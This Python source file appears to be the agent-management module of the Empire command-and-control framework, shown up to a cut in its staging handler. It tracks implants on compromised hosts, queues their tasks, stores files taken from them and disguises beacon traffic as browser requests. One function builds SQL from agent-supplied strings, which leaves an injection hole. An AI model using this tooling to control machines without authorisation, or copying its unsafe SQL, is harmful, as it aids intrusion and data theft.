"""

Main agent handling functionality for Empire.

The Agents() class in instantiated in ./empire.py by the main menu and includes:

    get_db_connection()         - returns the empire.py:mainMenu database connection object
    is_agent_present()          - returns True if an agent is present in the self.agents cache
    add_agent()                 - adds an agent to the self.agents cache and the backend database
    remove_agent_db()           - removes an agent from the self.agents cache and the backend database
    is_ip_allowed()             - checks if a supplied IP is allowed as per the whitelist/blacklist
    save_file()                 - saves a file download for an agent to the appropriately constructed path.
    save_module_file()          - saves a module output file to the appropriate path
    save_agent_log()            - saves the agent console output to the agent's log file
    is_agent_elevated()         - checks whether a specific sessionID is currently elevated
    get_agents_db()             - returns all active agents from the database
    get_agent_names_db()        - returns all names of active agents from the database
    get_agent_ids_db()          - returns all IDs of active agents from the database
    get_agent_db()              - returns complete information for the specified agent from the database
    get_agent_nonce_db()        - returns the nonce for this sessionID
    get_language_db()           - returns the language used by this agent
    get_language_version_db()   - returns the language version used by this agent
    get_agent_session_key_db()  - returns the AES session key from the database for a sessionID
    get_agent_results_db()      - returns agent results from the backend database
    get_agent_id_db()           - returns an agent sessionID based on the name
    get_agent_name_db()         - returns an agent name based on sessionID
    get_agent_hostname_db()     - returns an agent's hostname based on sessionID
    get_agent_os_db()           - returns an agent's operating system details based on sessionID
    get_agent_functions()       - returns the tab-completable functions for an agent from the cache
    get_agent_functions_db()    - returns the tab-completable functions for an agent from the database
    get_agents_for_listener()   - returns all agent objects linked to a given listener name
    get_agent_names_listener_db()-returns all agent names linked to a given listener name
    get_autoruns_db()           - returns any global script autoruns
    update_agent_results_db()   - updates agent results in the database
    update_agent_sysinfo_db()   - updates agent system information in the database
    update_agent_lastseen_db()  - updates the agent's last seen timestamp in the database
    update_agent_listener_db()  - updates the agent's listener name in the database
    rename_agent()              - renames an agent
    set_agent_field_db()        - sets field:value for a particular sessionID in the database.
    set_agent_functions_db()    - sets the tab-completable functions for the agent in the database
    set_autoruns_db()           - sets the global script autorun in the config in the database
    clear_autoruns_db()         - clears the currently set global script autoruns in the config in the database
    add_agent_task_db()         - adds a task to the specified agent's buffer in the database
    get_agent_tasks_db()        - retrieves tasks for our agent from the database
    get_agent_tasks_listener_db()- retrieves tasks for our agent from the database keyed by listener name
    clear_agent_tasks_db()      - clear out one (or all) agent tasks in the database
    handle_agent_staging()      - handles agent staging neogotiation
    handle_agent_data()         - takes raw agent data and processes it appropriately.
    handle_agent_request()      - return any encrypted tasks for the particular agent
    handle_agent_response()     - parses agent raw replies into structures
    process_agent_packet()      - processes agent reply structures appropriately

handle_agent_data() is the main function that should be used by external listener modules

Most methods utilize self.lock to deal with the concurreny issue of kicking off threaded listeners.

"""
from __future__ import absolute_import
from __future__ import print_function

import sqlite3
import json
import os
import string
import threading
from builtins import object
# -*- encoding: utf-8 -*-
from builtins import str
from datetime import datetime, timezone

from pydispatch import dispatcher
from zlib_wrapper import decompress

# Empire imports
from . import encryption
from . import events
from . import helpers
from . import messages
from . import packets
from lib.database.base import Session
from lib.database import models
from sqlalchemy import or_


class Agents(object):
    """
    Main class that contains agent handling functionality, including key
    negotiation in process_get() and process_post().
    """
    def __init__(self, MainMenu, args=None):

        # pull out the controller objects
        self.mainMenu = MainMenu
        self.installPath = self.mainMenu.installPath
        self.args = args

        # internal agent dictionary for the client's session key, funcions, and URI sets
        #   this is done to prevent database reads for extremely common tasks (like checking tasking URI existence)
        #   self.agents[sessionID] = {  'sessionKey' : clientSessionKey,
        #                               'functions' : [tab-completable function names for a script-import]
        #                            }
        self.agents = {}

        # used to protect self.agents and self.mainMenu.conn during threaded listener access
        self.lock = threading.Lock()

        # reinitialize any agents that already exist in the database
        dbAgents = self.get_agents_db()
        for agent in dbAgents:
            agentInfo = {'sessionKey' : agent['session_key'], 'functions' : agent['functions']}
            self.agents[agent['session_id']] = agentInfo

        # pull out common configs from the main menu object in empire.py
        self.ipWhiteList = self.mainMenu.ipWhiteList
        self.ipBlackList = self.mainMenu.ipBlackList


    def get_db_connection(self):
        """
        Returns the
        """
        self.lock.acquire()
        self.mainMenu.conn.row_factory = None
        self.lock.release()
        return self.mainMenu.conn


    ###############################################################
    #
    # Misc agent methods
    #
    ###############################################################

    def is_agent_present(self, sessionID):
        """
        Checks if a given sessionID corresponds to an active agent.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id_db(sessionID)
        if nameid:
            sessionID = nameid

        return sessionID in self.agents


    def add_agent(self, sessionID, externalIP, delay, jitter, profile, killDate, workingHours, lostLimit, sessionKey=None, nonce='', listener='', language=''):
        """
        Add an agent to the internal cache and database.
        """

        currentTime = helpers.getutcnow()
        checkinTime = currentTime
        lastSeenTime = currentTime

        # generate a new key for this agent if one wasn't supplied
        if not sessionKey:
            sessionKey = encryption.generate_aes_key()

        if not profile or profile == '':
            profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"

        # add the agent
        Session().add(models.Agent(name=sessionID,
                                   session_id=sessionID,
                                   delay=delay,
                                   jitter=jitter,
                                   external_ip=externalIP,
                                   session_key=sessionKey,
                                   nonce=nonce,
                                   checkin_time=checkinTime,
                                   lastseen_time=lastSeenTime,
                                   profile=profile,
                                   kill_date=killDate,
                                   working_hours=workingHours,
                                   lost_limit=lostLimit,
                                   listener=listener,
                                   language=language
                                   ))
        Session().commit()

        # dispatch this event
        message = "[*] New agent {} checked in".format(sessionID)
        signal = json.dumps({
            'print': True,
            'message': message,
            'timestamp': checkinTime.isoformat(),
            'event_type': 'checkin'
        })
        dispatcher.send(signal, sender="agents/{}".format(sessionID))

        # initialize the tasking/result buffers along with the client session key
        self.agents[sessionID] = {'sessionKey': sessionKey, 'functions': []}

    def get_agent_for_socket(self, session_id):
        agent = self.get_agent_db(session_id)

        lastseen_time = datetime.fromisoformat(agent['lastseen_time']).astimezone(timezone.utc)
        stale = helpers.is_stale(lastseen_time, agent['delay'], agent['jitter'])
        agent['stale'] = stale

        if isinstance(agent['session_key'], bytes):
            agent['session_key'] = agent['session_key'].decode('latin-1').encode('utf-8')

        return agent

    def remove_agent_db(self, sessionID):
        """
        Remove an agent to the internal cache and database.
        """

        conn = self.get_db_connection()

        try:
            if sessionID == '%' or sessionID.lower() == 'all':
                sessionID = '%'
                self.lock.acquire()
                self.agents = {}
            else:
                # see if we were passed a name instead of an ID
                nameid = self.get_agent_id_db(sessionID)
                if nameid:
                    sessionID = nameid

                self.lock.acquire()
                # remove the agent from the internal cache
                self.agents.pop(sessionID, None)

            # remove the agent from the database
            Session().connection().execute("DELETE FROM agents WHERE session_id LIKE ?", [sessionID])

            # dispatch this event
            message = "[*] Agent {} deleted".format(sessionID)
            signal = json.dumps({
                'print': True,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(sessionID))
        finally:
            self.lock.release()


    def is_ip_allowed(self, ip_address):
        """
        Check if the ip_address meshes with the whitelist/blacklist, if set.
        """

        self.lock.acquire()
        if self.ipBlackList:
            if self.ipWhiteList:
                results = ip_address in self.ipWhiteList and ip_address not in self.ipBlackList
                self.lock.release()
                return results
            else:
                results = ip_address not in self.ipBlackList
                self.lock.release()
                return results
        if self.ipWhiteList:
            results = ip_address in self.ipWhiteList
            self.lock.release()
            return results
        else:
            self.lock.release()
            return True


    def save_file(self, sessionID, path, data, filesize, append=False):
        """
        Save a file download for an agent to the appropriately constructed path.
        """
        nameid = self.get_agent_id_db(sessionID)
        if nameid:
            sessionID = nameid

        lang = self.get_language_db(sessionID)
        parts = path.split("\\")

        # construct the appropriate save path
        save_path = "%sdownloads/%s/%s" % (self.installPath, sessionID, "/".join(parts[0:-1]))
        filename = os.path.basename(parts[-1])

        try:
            self.lock.acquire()
            # fix for 'skywalker' exploit by @zeroSteiner
            safePath = os.path.abspath("%sdownloads/" % self.installPath)
            if not os.path.abspath(save_path + "/" + filename).startswith(safePath):
                message = "[!] WARNING: agent {} attempted skywalker exploit!\n[!] attempted overwrite of {} with data {}".format(sessionID, path, data)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
                return

            # make the recursive directory structure if it doesn't already exist
            if not os.path.exists(save_path):
                os.makedirs(save_path)

            # overwrite an existing file
            if not append:
                f = open("%s/%s" % (save_path, filename), 'wb')
            else:
                # otherwise append
                f = open("%s/%s" % (save_path, filename), 'ab')

            if "python" in lang:
                print(helpers.color("\n[*] Compressed size of %s download: %s" %(filename, helpers.get_file_size(data)), color="green"))
                d = decompress.decompress()
                dec_data = d.dec_data(data)
                print(helpers.color("[*] Final size of %s wrote: %s" %(filename, helpers.get_file_size(dec_data['data'])), color="green"))
                if not dec_data['crc32_check']:
                    message = "[!] WARNING: File agent {} failed crc32 check during decompression!\n[!] HEADER: Start crc32: %s -- Received crc32: %s -- Crc32 pass: %s!".format(nameid, dec_data['header_crc32'], dec_data['dec_crc32'], dec_data['crc32_check'])
                    signal = json.dumps({
                        'print': True,
                        'message': message
                    })
                    dispatcher.send(signal, sender="agents/{}".format(nameid))
                data = dec_data['data']

            f.write(data)
            f.close()
        finally:
            self.lock.release()

        percent = round(int(os.path.getsize("%s/%s" % (save_path, filename)))/int(filesize)*100,2)

        # notify everyone that the file was downloaded
        message = "[+] Part of file {} from {} saved [{}%]".format(filename, sessionID, percent)
        signal = json.dumps({
            'print': True,
            'message': message
        })
        dispatcher.send(signal, sender="agents/{}".format(sessionID))

    def save_module_file(self, sessionID, path, data):
        """
        Save a module output file to the appropriate path.
        """

        sessionID = self.get_agent_name_db(sessionID)
        lang = self.get_language_db(sessionID)
        parts = path.split("/")

        # construct the appropriate save path
        save_path = "%s/downloads/%s/%s" % (self.installPath, sessionID, "/".join(parts[0:-1]))
        filename = parts[-1]

        # decompress data if coming from a python agent:
        if "python" in lang:
            print(helpers.color("\n[*] Compressed size of %s download: %s" %(filename, helpers.get_file_size(data)), color="green"))
            d = decompress.decompress()
            dec_data = d.dec_data(data)
            print(helpers.color("[*] Final size of %s wrote: %s" %(filename, helpers.get_file_size(dec_data['data'])), color="green"))
            if not dec_data['crc32_check']:
                message = "[!] WARNING: File agent {} failed crc32 check during decompression!\n[!] HEADER: Start crc32: %s -- Received crc32: %s -- Crc32 pass: %s!".format(sessionID, dec_data['header_crc32'], dec_data['dec_crc32'], dec_data['crc32_check'])
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
            data = dec_data['data']

        try:
            self.lock.acquire()
            # fix for 'skywalker' exploit by @zeroSteiner
            safePath = os.path.abspath("%s/downloads/" % self.installPath)
            if not os.path.abspath(save_path + "/" + filename).startswith(safePath):
                message = "[!] WARNING: agent {} attempted skywalker exploit!\n[!] attempted overwrite of {} with data {}".format(sessionID, path, data)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
                return

            # make the recursive directory structure if it doesn't already exist
            if not os.path.exists(save_path):
                os.makedirs(save_path)

            # save the file out
            f = open("%s/%s" % (save_path, filename), 'wb')

            f.write(data)
            f.close()
        finally:
            self.lock.release()

        # notify everyone that the file was downloaded
        message = "\n[+] File {} from {} saved".format(path, sessionID)
        signal = json.dumps({
            'print': True,
            'message': message
        })
        dispatcher.send(signal, sender="agents/{}".format(sessionID))

        return "/downloads/%s/%s/%s" % (sessionID, "/".join(parts[0:-1]), filename)


    def save_agent_log(self, sessionID, data):
        """
        Save the agent console output to the agent's log file.
        """
        if isinstance(data, bytes):
           data = data.decode('UTF-8')
        name = self.get_agent_name_db(sessionID)
        save_path = self.installPath + "/downloads/" + str(name) + "/"

        try:
            self.lock.acquire()
            # make the recursive directory structure if it doesn't already exist
            if not os.path.exists(save_path):
                os.makedirs(save_path)

            current_time = helpers.get_datetime()

            f = open("%s/agent.log" % (save_path), 'a')
            f.write("\n" + current_time + " : " + "\n")
            f.write(data + "\n")
            f.close()
        finally:
            self.lock.release()


    ###############################################################
    #
    # Methods to get information from agent fields.
    #
    ###############################################################

    def is_agent_elevated(self, sessionID):
        """
        Check whether a specific sessionID is currently elevated.
=
        This means root for OS X/Linux and high integrity for Windows.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id_db(sessionID)
        if nameid:
            sessionID = nameid

        elevated = Session().connection().execute("SELECT high_integrity FROM agents WHERE session_id=?", [sessionID]).first()

        if elevated and elevated != None and elevated != ():
            return int(elevated[0]) == 1
        else:
            return False


    def get_agents_db(self):
        """
        Return all active agents from the database.
        """
        results = []

        results_raw = Session().connection().execute("SELECT * FROM agents").fetchall()
        for x in range(len(results_raw)):
            results.append(dict(results_raw[x]))

        return results


    def get_agent_names_db(self):
        """
        Return all names of active agents from the database.
        """
        results = Session().query(models.Agent.name).all()

        # make sure names all ascii encoded
        results = [r[0].encode('ascii', 'ignore') for r in results]
        return results


    def get_agent_ids_db(self):
        """
        Return all IDs of active agents from the database.
        """
        results = Session().query(models.Agent.session_id).all()

        # make sure names all ascii encoded
        results = [str(r[0]).encode('ascii', 'ignore') for r in results if r]
        return results


    def get_agent_db(self, session_id):
        """
        Return complete information for the specified agent from the database.
        """

        agents_raw = Session().connection().execute("SELECT * FROM agents WHERE session_id = ? OR name = ?",
                                                     [session_id, session_id]).fetchall()

        agent = []
        for x in range(len(agents_raw)):
            agent.append(dict(agents_raw[x]))

        return agent[0]


    def get_agent_nonce_db(self, session_id):
        """
        Return the nonce for this sessionID.
        """

        nonce = Session().query(models.Agent.nonce).filter(models.Agent.session_id == session_id).first()

        if nonce and nonce is not None:
            if type(nonce) is str:
                return nonce
            else:
                return nonce[0]


    def get_language_db(self, session_id):
        """
        Return the language used by this agent.
        """
        # see if we were passed a name instead of an ID
        name_id = self.get_agent_id_db(session_id)
        if name_id:
            session_id = name_id

        language = Session().query(models.Agent.language).filter(models.Agent.session_id == session_id).first()

        if language is not None:
            if isinstance(language, str):
                return language
            else:
                return language[0]


    def get_language_version_db(self, session_id):
        """
        Return the language version used by this agent.
        """
        # see if we were passed a name instead of an ID
        name_id = self.get_agent_id_db(session_id)
        if name_id:
            session_id = name_id

        language_version = Session().query(models.Agent.language_version).filter(models.Agent.session_id == session_id).first()

        if language_version is not None:
            if isinstance(language_version, str):
                return language_version
            else:
                return language_version[0]


    def get_agent_session_key_db(self, session_id):
        """
        Return AES session key from the database for this sessionID.
        """

        agent = Session().query(models.Agent).filter(or_(models.Agent.session_id == session_id, models.Agent.name == session_id)).first()

        if agent is not None:
            return agent.session_key


    def get_agent_results_db(self, session_id):
        """
        Return agent results from the backend database.
        """
        agent_name = session_id

        # see if we were passed a name instead of an ID
        name_id = self.get_agent_id_db(session_id)
        if name_id:
            session_id = name_id

        if session_id not in self.agents:
            print(helpers.color("[!] Agent %s not active." % (agent_name)))
        else:
            agent = Session().query(models.Agent).filter(models.Agent.session_id == session_id).first()
            results = agent.results
            agent.results = ''
            Session().commit()

            if results and results != '':
                out = json.loads(results)
                if out:
                    return out
            else:
                return ''


    def get_agent_id_db(self, name):
        """
        Get an agent sessionID based on the name.
        """

        agent = Session().query(models.Agent).filter((models.Agent.name == name)).first()

        if agent:
            return agent.session_id
        else:
            return None


    def get_agent_name_db(self, session_id):
        """
        Return an agent name based on sessionID.
        """
        agent = Session().query(models.Agent).filter(or_(models.Agent.session_id == session_id, models.Agent.name == session_id)).first()

        if agent:
            return agent.name
        else:
            return None


    def get_agent_hostname_db(self, session_id):
        """
        Return an agent's hostname based on sessionID.
        """
        agent = Session().query(models.Agent).filter(or_(models.Agent.session_id == session_id, models.Agent.name == session_id)).first()

        if agent:
            return agent.hostname
        else:
            return None


    def get_agent_os_db(self, session_id):
        """
        Return an agent's operating system details based on sessionID.
        """
        agent = Session().query(models.Agent).filter(or_(models.Agent.session_id == session_id, models.Agent.name == session_id)).first()

        if agent:
            return agent.os_details
        else:
            return None


    def get_agent_functions(self, session_id):
        """
        Get the tab-completable functions for an agent.
        """

        # see if we were passed a name instead of an ID
        name_id = self.get_agent_id_db(session_id)
        if name_id:
            session_id = name_id

        results = []

        try:
            self.lock.acquire()
            if session_id in self.agents:
                results = self.agents[session_id]['functions']
        finally:
            self.lock.release()

        return results


    def get_agent_functions_db(self, session_id):
        """
        Return the tab-completable functions for an agent from the database.
        """
        agent = Session().query(models.Agent).filter(or_(models.Agent.session_id == session_id, models.Agent.name == session_id)).first()

        if agent.functions is not None:
            return agent.functions.split(',')
        else:
            return []


    def get_agents_for_listener(self, listener_name):
        """
        Return agent objects linked to a given listener name.
        """
        agent = Session().query(models.Agent).filter(models.Agent.listener == listener_name).all()

        # make sure names all ascii encoded
        results = [r[0].encode('ascii', 'ignore') for r in agent.session_id]
        return results


    def get_agent_names_listener_db(self, listener_name):
        """
        Return agent names linked to the given listener name.
        """

        agents = Session().query(models.Agent).filter(models.Agent.listener == listener_name).all()

        return agents


    def get_autoruns_db(self):
        """
        Return any global script autoruns.
        """

        conn = self.get_db_connection()

        autoruns = None

        try:
            self.lock.acquire()
            cur = conn.cursor()
            cur.execute("SELECT autorun_command FROM config")
            results = cur.fetchone()
            if results:
                autorun_command = results[0]
            else:
                autorun_command = ''

            cur = conn.cursor()
            cur.execute("SELECT autorun_data FROM config")
            results = cur.fetchone()
            if results:
                autorun_data = results[0]
            else:
                autorun_data = ''
            cur.close()
            autoruns = [autorun_command, autorun_data]
        finally:
            self.lock.release()

        return autoruns

    ###############################################################
    #
    # Methods to update agent information fields.
    #
    ###############################################################
    def update_dir_list(self, session_id, response):
        """"
        Update the directory list
        """
        name_id = self.get_agent_id_db(session_id)
        if name_id:
            session_id = name_id

        if session_id in self.agents:
            conn = self.get_db_connection()
            old_factory = conn.row_factory
            conn.row_factory = sqlite3.Row
            try:
                self.lock.acquire()
                cur = conn.cursor()

                # get existing files/dir that are in this directory.
                # delete them and their children to keep everything up to date. There's a cascading delete on the table.
                this_directory = cur.execute("SELECT * FROM file_directory where session_id = ? and path = ?",
                                             [session_id, response['directory_path']]).fetchone()
                if this_directory:
                    cur.execute("DELETE FROM file_directory WHERE session_id = ? and parent_id = ?",
                                [session_id, this_directory['id']])
                else:  # if the directory doesn't exist we have to create one
                    # parent is None for now even though it might have one. This is self correcting.
                    # If it's true parent is scraped, then this entry will get rewritten
                    cur.execute("INSERT INTO file_directory  ('name', 'path', 'parent_id', 'is_file', 'session_id')VALUES ('{0}', '{1}', '{2}', '{3}', '{4}')"
                                .format(response['directory_name'], response['directory_path'], None, 0, session_id))
                    this_directory = cur.execute("SELECT * FROM file_directory where session_id = ? and path = ?",
                                                 [session_id, response['directory_path']]).fetchone()

                delete = ""
                insert = "INSERT INTO file_directory  ('name', 'path', 'parent_id', 'is_file', 'session_id') VALUES "
                insert_arr = []
                # insert all the new items
                for item in response['items']:
                    # Delete it if its already there so that we can be self correcting
                    delete += f"\nDELETE FROM file_directory WHERE session_id = '{session_id}' AND path = '{item['path']}';"
                    insert_arr.append(f"('{item['name']}', '{item['path']}', '{None if not this_directory else this_directory['id']}', '{1 if item['is_file'] is True else 0}', '{session_id}')")

                if len(insert_arr) > 0:
                    cur.executescript(delete)
                    cur.execute(insert + ','.join(insert_arr) + ';')
                cur.close()
            finally:
                conn.row_factory = old_factory
                self.lock.release()

    def update_agent_results_db(self, session_id, results):
        """
        Update agent results in the database.
        """

        # see if we were passed a name instead of an ID
        if isinstance(results, bytes):
            results = results.decode('UTF-8')

        name_id = self.get_agent_id_db(session_id)
        if name_id:
            session_id = name_id

        if session_id in self.agents:
            agent = Session().query(models.Agent).filter(models.Agent.session_id == session_id).first()

            if agent.results:
                agent_results = agent.results
            else:
                agent_results = ''

            agent_results += '\n' + results
            agent.results = json.dumps(agent_results)
            Session().commit()

        else:
            message = "[!] Non-existent agent %s returned results".format(session_id)
            signal = json.dumps({
                'print': True,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(session_id))


    def update_agent_sysinfo_db(self, session_id, listener='', external_ip='', internal_ip='', username='', hostname='', os_details='', high_integrity=0, process_name='', process_id='', language_version='', language=''):
        """
        Update an agent's system information.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id_db(session_id)
        if nameid:
            session_id = nameid

        agent = Session().query(models.Agent).filter(models.Agent.session_id == session_id).first()

        agent.internal_ip = internal_ip
        agent.username = username
        agent.hostname = hostname
        agent.os_details = os_details
        agent.high_integrity = high_integrity
        agent.process_name = process_name
        agent.process_id = process_id
        agent.language_version = language_version
        agent.language = language

        Session().commit()


    def update_agent_lastseen_db(self, session_id, current_time=None):
        """
        Update the agent's last seen timestamp in the database.
        """

        if not current_time:
            current_time = helpers.getutcnow()

        agent = Session().query(models.Agent).filter(or_(models.Agent.session_id == session_id, models.Agent.name == session_id)).first()
        agent.lastseen_time = current_time
        Session.commit()


    def update_agent_listener_db(self, session_id, listener_name):
        """
        Update the specified agent's linked listener name in the database.
        """

        agent = Session().query(models.Agent).filter(or_(models.Agent.session_id == session_id, models.Agent.name == session_id)).first()
        agent.listener = listener_name
        Session.commit()


    def rename_agent(self, old_name, new_name):
        """
        Rename a given agent from 'oldname' to 'newname'.
        """

        if not new_name.isalnum():
            print(helpers.color("[!] Only alphanumeric characters allowed for names."))
            return False

        # rename the logging/downloads folder
        old_path = "%s/downloads/%s/" % (self.installPath, old_name)
        new_path = "%s/downloads/%s/" % (self.installPath, new_name)
        ret_val = True

        # check if the folder is already used
        if os.path.exists(new_path):
            print(helpers.color("[!] Name already used by current or past agent."))
            ret_val = False
        else:
            # move the old folder path to the new one
            if os.path.exists(old_path):
                os.rename(old_path, new_path)

            # rename the agent in the database
            agent = Session().query(models.Agent).filter(models.Agent.name == old_name).first()
            agent.name = new_name

            # change tasking and results to new agent
            # maybe not needed
            # taskings = Session().query(models.Tasking).filter(models.Tasking.agent == old_name).all()
            # results = Session().query(models.Result).filter(models.Result.agent == old_name).all()
            #
            # if taskings:
            #     for x in range(len(taskings)):
            #         taskings[x].agent = new_name
            #
            # if results:
            #     for x in range(len(results)):
            #         results[x].agent = new_name

            Session.commit()
            ret_val = True

        # signal in the log that we've renamed the agent
        self.save_agent_log(old_name, "[*] Agent renamed from %s to %s" % (old_name, new_name))

        return ret_val

    def set_agent_field_db(self, field, value, session_id):
        """
        Set field:value for a particular sessionID in the database.
        """
        agent = Session().query(models.Agent).filter(or_(models.Agent.session_id == session_id, models.Agent.name == session_id)).first()

        agent[field] = value

        Session.commit()

    def set_agent_functions_db(self, session_id, functions):
        """
        Set the tab-completable functions for the agent in the database.
        """

        # see if we were passed a name instead of an ID
        name_id = self.get_agent_id_db(session_id)
        if name_id:
            session_id = name_id

        if session_id in self.agents:
            self.agents[session_id]['functions'] = functions

        functions = ','.join(functions)

        agent = Session().query(models.Agent).filter(models.Agent.session_id == session_id).first()
        agent.functions = functions
        Session.commit()

    def set_autoruns_db(self, taskCommand, moduleData):
        """
        Set the global script autorun in the config in the database.
        """

        try:
            conn = self.get_db_connection()
            cur = conn.cursor()
            cur.execute("UPDATE config SET autorun_command=?", [taskCommand])
            cur.execute("UPDATE config SET autorun_data=?", [moduleData])
            cur.close()
        except Exception:
            print(helpers.color("[!] Error: script autoruns not a database field, run ./setup_database.py to reset DB schema."))
            print(helpers.color("[!] Warning: this will reset ALL agent connections!"))


    def clear_autoruns_db(self):
        """
        Clear the currently set global script autoruns in the config in the database.
        """

        conn = self.get_db_connection()
        try:
            self.lock.acquire()
            cur = conn.cursor()
            cur.execute("UPDATE config SET autorun_command=''")
            cur.execute("UPDATE config SET autorun_data=''")
            cur.close()
        finally:
            self.lock.release()


    ###############################################################
    #
    # Agent tasking methods
    #
    ###############################################################

    def add_agent_task_db(self, sessionID, taskName, task='', moduleName=None, uid=None):
        """
        Add a task to the specified agent's buffer in the database.
        """
        agentName = sessionID
        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id_db(sessionID)
        timestamp = helpers.getutcnow()

        if nameid:
            sessionID = nameid

        if sessionID not in self.agents:
            print(helpers.color("[!] Agent %s not active." % (agentName)))
        else:
            if sessionID:
                message = "[*] Tasked {} to run {}".format(sessionID, taskName)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))

                conn = self.get_db_connection()
                try:
                    self.lock.acquire()
                    # get existing agent taskings
                    cur = conn.cursor()
                    cur.execute("SELECT taskings FROM agents WHERE session_id=?", [sessionID])
                    agent_tasks = cur.fetchone()

                    if agent_tasks and agent_tasks[0]:
                        agent_tasks = json.loads(agent_tasks[0])
                    else:
                        agent_tasks = []

                    pk = cur.execute("SELECT max(id) from taskings where agent=?", [sessionID]).fetchone()[0]
                    if pk is None:
                        pk = 0
                    pk = (pk + 1) % 65536
                    cur.execute("INSERT INTO taskings (id, agent, data, user_id, timestamp, module_name) VALUES(?,?,?,?,?,?)",
                                [pk, sessionID, task[:100], uid, timestamp, moduleName])
                    # self.mainMenu.socketio.emit('agent/task', {'sessionID': sessionID, 'taskID': pk, 'data': task[:100]})

                    # Create result for data when it arrives
                    cur.execute("INSERT INTO results (id, agent, user_id) VALUES (?,?,?)", (pk, sessionID, uid))

                    # append our new json-ified task and update the backend
                    agent_tasks.append([taskName, task, pk])
                    cur.execute("UPDATE agents SET taskings=? WHERE session_id=?", [json.dumps(agent_tasks), sessionID])

                    # update last seen time for user
                    last_logon = helpers.getutcnow()
                    cur.execute("UPDATE users SET last_logon_time = ? WHERE id = ?",
                                (last_logon, uid))

                    # dispatch this event
                    message = "[*] Agent {} tasked with task ID {}".format(sessionID, pk)
                    signal = json.dumps({
                        'print': True,
                        'message': message,
                        'task_name': taskName,
                        'task_id': pk,
                        'task': task,
                        'event_type': 'task'
                    })
                    dispatcher.send(signal, sender="agents/{}".format(sessionID))

                    cur.close()

                    # write out the last tasked script to "LastTask" if in debug mode
                    if self.args and self.args.debug:
                        f = open('%s/LastTask' % (self.installPath), 'w')
                        f.write(task)
                        f.close()
                    return pk

                finally:
                    self.lock.release()


    def get_agent_tasks_db(self, session_id):
        """
        Retrieve tasks for our agent from the database.
        """

        agent_name = session_id

        # see if we were passed a name instead of an ID
        name_id = self.get_agent_id_db(session_id)
        if name_id:
            session_id = name_id

        if session_id not in self.agents:
            print(helpers.color("[!] Agent %s not active." % agent_name))
            return []
        else:
            agent = Session().query(models.Agent).filter(models.Agent.session_id == session_id).first()
            if agent.taskings:
                tasks = json.loads(agent.taskings)

                # clear the taskings out
                agent.taskings = ''
                Session().commit
            else:
                tasks = []

            return tasks


    def get_agent_tasks_listener_db(self, listenerName):
        """
        Retrieve tasks for our agent from the database keyed by the
        supplied listner name.

        returns a list of (sessionID, taskings) tuples
        """

        conn = self.get_db_connection()
        results = []

        try:
            self.lock.acquire()
            oldFactory = conn.row_factory
            conn.row_factory = helpers.dict_factory # return results as a dictionary
            cur = conn.cursor()
            cur.execute("SELECT session_id,listener,taskings FROM agents WHERE listener=? AND taskings IS NOT NULL", [listenerName])
            agents = cur.fetchall()

            for agent in agents:
                # print agent
                if agent['taskings']:
                    tasks = json.loads(agent['taskings'])
                    # clear the taskings out
                    cur.execute("UPDATE agents SET taskings=? WHERE session_id=?", ['', agent['session_id']])
                    results.append((agent['session_id'], tasks))
            cur.close()
            conn.row_factory = oldFactory
        finally:
            self.lock.release()

        return results


    def clear_agent_tasks_db(self, session_id):
        """
        Clear out agent tasks in the database.
        """

        agent = Session().query(models.Agent).filter(or_(models.Agent.session_id == session_id, models.Agent.name == session_id)).first()
        agent.taskings = ''
        Session.commit()

        message = "[*] Tasked {} to clear tasks".format(session_id)
        signal = json.dumps({
            'print': True,
            'message': message
        })
        dispatcher.send(signal, sender="agents/{}".format(session_id))


    ###############################################################
    #
    # Agent staging/data processing components
    #
    ###############################################################

    def handle_agent_staging(self, sessionID, language, meta, additional, encData, stagingKey, listenerOptions, clientIP='0.0.0.0'):
        """
        Handles agent staging/key-negotiation.
        TODO: does this function need self.lock?
        """

        listenerName = listenerOptions['Name']['Value']

        if meta == 'STAGE0':
            # step 1 of negotiation -> client requests staging code
            return 'STAGE0'

        elif meta == 'STAGE1':
            # step 3 of negotiation -> client posts public key
            message = "[*] Agent {} from {} posted public key".format(sessionID, clientIP)
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(sessionID))

            # decrypt the agent's public key
            try:
                message = encryption.aes_decrypt_and_verify(stagingKey, encData)
            except Exception as e:
                print('exception e:' + str(e))
                # if we have an error during decryption
                message = "[!] HMAC verification failed from '{}'".format(sessionID)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
                return 'ERROR: HMAC verification failed'

            if language.lower() == 'powershell':
                # strip non-printable characters
                message = ''.join([x for x in message.decode('UTF-8') if x in string.printable])

                # client posts RSA key
                if (len(message) < 400) or (not message.endswith("</RSAKeyValue>")):
                    message = "[!] Invalid PowerShell key post format from {}".format(sessionID)
                    signal = json.dumps({
                        'print': True,
                        'message': message
                    })
                    dispatcher.send(signal, sender="agents/{}".format(sessionID))
                    return 'ERROR: Invalid PowerShell key post format'
                else:
                    # convert the RSA key from the stupid PowerShell export format
                    rsaKey = encryption.rsa_xml_to_key(message)

                    if rsaKey:
                        message = "[*] Agent {} from {} posted valid PowerShell RSA key".format(sessionID, clientIP)
                        signal = json.dumps({
                            'print': False,
                            'message': message
                        })
                        dispatcher.send(signal, sender="agents/{}".format(sessionID))
                        nonce = helpers.random_string(16, charset=string.digits)
                        delay = listenerOptions['DefaultDelay']['Value']
                        jitter = listenerOptions['DefaultJitter']['Value']
                        profile = listenerOptions['DefaultProfile']['Value']
                        killDate = listenerOptions['KillDate']['Value']
                        workingHours = listenerOptions['WorkingHours']['Value']
                        lostLimit = listenerOptions['DefaultLostLimit']['Value']

